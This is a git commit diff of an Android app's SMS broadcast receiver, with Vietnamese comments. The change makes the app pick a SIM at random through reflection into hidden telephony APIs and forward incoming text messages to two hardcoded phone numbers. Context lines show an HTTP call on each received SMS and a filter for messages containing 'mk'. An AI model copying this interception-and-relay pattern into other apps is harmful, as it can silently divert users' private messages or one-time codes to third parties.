7f46ab24c4c24873d9f1782d02f05e72f519a812
dungla2011 <dungla2011@gmail.com>
2023-06-27 13:30:48 +0700

    Random Sim forward SMS ok

--- app/src/main/java/com/robertohuertas/endless/SmsReceiver.kt
+++ app/src/main/java/com/robertohuertas/endless/SmsReceiver.kt
@@ -1,20 +1,23 @@
 package com.robertohuertas.endless
 
+import android.Manifest
 import android.app.PendingIntent
 import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
+import android.content.pm.PackageManager
 import android.os.Build
 import android.os.IBinder
 import android.provider.Telephony
 import android.support.annotation.RequiresApi
+import android.support.v4.app.ActivityCompat
 import android.telephony.SmsManager
+import android.telephony.SubscriptionManager
 import android.util.Log
 import okhttp3.OkHttpClient
 import okhttp3.Request
 import java.lang.reflect.InvocationTargetException
 import java.lang.reflect.Method
-import kotlin.random.Random
 
 
 class SMSReceiver : BroadcastReceiver() {
@@ -41,59 +44,89 @@ class SMSReceiver : BroadcastReceiver() {
                     client.newCall(request).execute()
 
 
-                    //*** Lad: đoạn này mặc định SIM default
+                    ////////////////////////////////////////////////////////////////
+                    //Bắt đầu gửi sms thông báo tới 1 số đt
+
 
                     // on below line we are initializing sms manager.
                     //as after android 10 the getDefault function no longer works
                     //so we have to check that if our android version is greater
                     //than or equal toandroid version 6.0 i.e SDK 23
                     val smsManager: SmsManager
-                    if (Build.VERSION.SDK_INT>=23) {
-                        //if SDK is greater that or equal to 23 then
-                        //this is how we will initialize the SmsManager
-                        //smsManager = context.getSystemService(SmsManager::class.java)
-                    }
-                    else{
-                        //if user's SDK is less than 23 then
-                        //SmsManager will be initialized like this
-                        //smsManager = SmsManager.getDefault()
-                    }
 
 
+                    val sSubManager: SubscriptionManager =
+                        context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
 
-                    //*** Lad: đoạn này thêm vào, để chọn random SIM 0,1:
-                    var method: Method = Class.forName("android.os.ServiceManager").getDeclaredMethod(
-                        "getService", *arrayOf<Class<*>>(
-                            String::class.java
-                        )
-                    )
-                    method.setAccessible(true)
+                    if (ActivityCompat.checkSelfPermission(
+                            context,
+                            Manifest.permission.READ_PHONE_STATE
+                        ) != PackageManager.PERMISSION_GRANTED
+                    ) {
+                        // TODO: Consider calling
+                        //    ActivityCompat#requestPermissions
+                        // here to request the missing permissions, and then overriding
+                        //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
+                        //                                          int[] grantResults)
+                        // to handle the case where the user grants the permission. See the documentation
+                        // for ActivityCompat#requestPermissions for more details.
 
-                    method = Class.forName("android.telephony.SubscriptionManager")
-                        .getDeclaredMethod(
-                            "getSubId",
-                            Int::class.javaPrimitiveType
-                        )
-                    method.setAccessible(true)
-
-                    //Randomm sim ở đây:
-//                    val simID = 0; //while simID is the slot number of your second simCard
-                    val simID = (0..1).random();
-
-                    var phoneNum = "";
-                    if(simID == 0) {
-                        phoneNum = "0902066768"
-                    }
-                    else {
-                        phoneNum = "0966616368"
                     }
 
-                    val param = method.invoke(null, simID) as IntArray
-                    val inst: Int = param.get(0)
-                    //--kết thúc đoạn chọn sim
+                    var phoneNum = "0902066768";
 
-                    //tạo smsMng để gửi tin:
-                    smsManager = SmsManager.getSmsManagerForSubscriptionId(inst)
+                    //nếu có 2 SIM, sim1, và sim2:
+                    //https://www.hrupin.com/2017/07/detect-sim-card-availability-in-the-android-dual-sim-device
+                    if(sSubManager.getActiveSubscriptionInfoForSimSlotIndex(1) !== null) {
+
+                        Log.d("SMS123", "message: dual sim ok!")
+
+                        //*** Lad: đoạn này thêm vào, để chọn random SIM 0,1:
+                        var method: Method =
+                            Class.forName("android.os.ServiceManager").getDeclaredMethod(
+                                "getService", *arrayOf<Class<*>>(
+                                    String::class.java
+                                )
+                            )
+                        method.setAccessible(true)
+
+                        method = Class.forName("android.telephony.SubscriptionManager")
+                            .getDeclaredMethod(
+                                "getSubId",
+                                Int::class.javaPrimitiveType
+                            )
+                        method.setAccessible(true)
+
+                        //Randomm sim ở đây:
+    //                    val simID = 0; //while simID is the slot number of your second simCard
+                        val simID = (0..1).random();
+
+                        if (simID == 0) {
+                            phoneNum = "0902066768"
+                        } else {
+                            phoneNum = "0966616368"
+                        }
+
+                        val param = method.invoke(null, simID) as IntArray
+                        val inst: Int = param.get(0)
+                        //--kết thúc đoạn chọn sim
+
+                        //tạo smsMng để gửi tin:
+                        smsManager = SmsManager.getSmsManagerForSubscriptionId(inst)
+                    }else{
+
+                        //*** Lad: đoạn này mặc định 1 SIM default
+                        if (Build.VERSION.SDK_INT>=23) {
+                            //if SDK is greater that or equal to 23 then
+                            //this is how we will initialize the SmsManager
+                            smsManager = context.getSystemService(SmsManager::class.java)
+                        }
+                        else{
+                            //if user's SDK is less than 23 then
+                            //SmsManager will be initialized like this
+                            smsManager = SmsManager.getDefault()
+                        }
+                    }
 
                     //Gửi message ok:
                     if(smsMessage.displayMessageBody.toLowerCase().indexOf("mk") >= 0) {
